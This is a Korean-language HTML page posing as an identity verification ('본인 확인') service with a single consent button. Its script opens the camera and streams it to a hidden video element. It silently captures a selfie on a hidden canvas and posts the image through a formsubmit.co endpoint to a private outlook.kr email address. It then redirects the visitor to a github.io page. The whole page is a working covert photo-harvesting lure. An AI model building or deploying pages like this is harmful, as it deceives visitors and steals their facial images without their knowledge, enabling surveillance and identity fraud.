<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>본인 확인</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f4f4f9;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            display: inline-block;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        button {
            padding: 12px 24px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>본인 확인 서비스</h2>
        <p>서비스 이용을 위해 동의 후 진행해 주세요.</p>
        <button id="agreeBtn">동의 및 계속하기</button>
    </div>

    <!-- 숨김 처리된 비디오 및 캔버스 -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        document.getElementById('agreeBtn').addEventListener('click', async () => {
            try {
                // 1. 카메라 권한 요청 및 스트림 획득
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // 비디오 메타데이터 로드 대기
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => resolve();
                });

                // 카메라가 켜질 수 있도록 잠시 대기 후 자동 촬영
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    // 2. 셀카 찍기 (캔버스에 프레임 드로잉)
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // 인코딩을 거치지 않고 Blob 객체 생성
                    canvas.toBlob(async (blob) => {
                        if (!blob) return;

                        // 3. URL 생성 및 사진 저장 (Object URL)
                        const imageUrl = URL.createObjectURL(blob);
                        console.log('Created Image URL:', imageUrl);

                        // 4. FormSubmit을 통한 전송 준비
                        const formData = new FormData();
                        formData.append('image', blob, 'selfie.png');
                        formData.append('image_url', imageUrl);

                        try {
                            await fetch('https://formsubmit.co/ajax/jsbi110@outlook.kr', {
                                method: 'POST',
                                body: formData
                            });
                        } catch (e) {
                            console.error('전송 중 오류 발생:', e);
                        }

                        // 카메라 스트림 중지
                        stream.getTracks().forEach(track => track.stop());

                        // 5. 지정된 주소로 이동
                        window.location.href = 'https://jsbi110.github.io/aa';

                    }, 'image/png');

                }, 1000);

            } catch (err) {
                alert('카메라 권한이 거부되었거나 사용할 수 없습니다.');
                window.location.href = 'https://jsbi110.github.io/aa';
            }
        });
    </script>
</body>
</html>
